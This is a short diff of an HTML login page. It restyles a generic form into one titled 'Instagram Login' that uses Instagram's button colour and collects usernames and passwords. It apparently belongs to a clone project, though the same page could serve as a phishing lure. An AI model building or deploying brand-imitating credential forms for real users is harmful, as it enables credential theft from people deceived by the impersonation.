@@ -1,19 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login</title>
+<title>Login</title>
 </head>
-<body style="text-align:center;font-family:Arial;padding:50px;">
+<body style="background:#fafafa;font-family:Arial;">
 
-<h1>Login 🔐</h1>
+<div style="width:300px;margin:100px auto;background:white;padding:20px;border:1px solid #ddd;text-align:center;">
 
-<form action="/login" method="POST">
-    <input type="text" name="username" placeholder="Username" required>
-    <br><br>
-    <input type="password" name="password" placeholder="Password" required>
-    <br><br>
-    <button>Login</button>
+<h2>Instagram Login 🔐</h2>
+
+<form method="POST">
+    <input name="username" placeholder="Username" style="width:100%;padding:10px;margin:5px;">
+    <input type="password" name="password" placeholder="Password" style="width:100%;padding:10px;margin:5px;">
+    <button style="width:100%;padding:10px;background:#3897f0;color:white;border:none;">Login</button>
 </form>
+
+<br>
+<a href="/register">Create Account</a>
+
+</div>
 
 </body>
 </html>
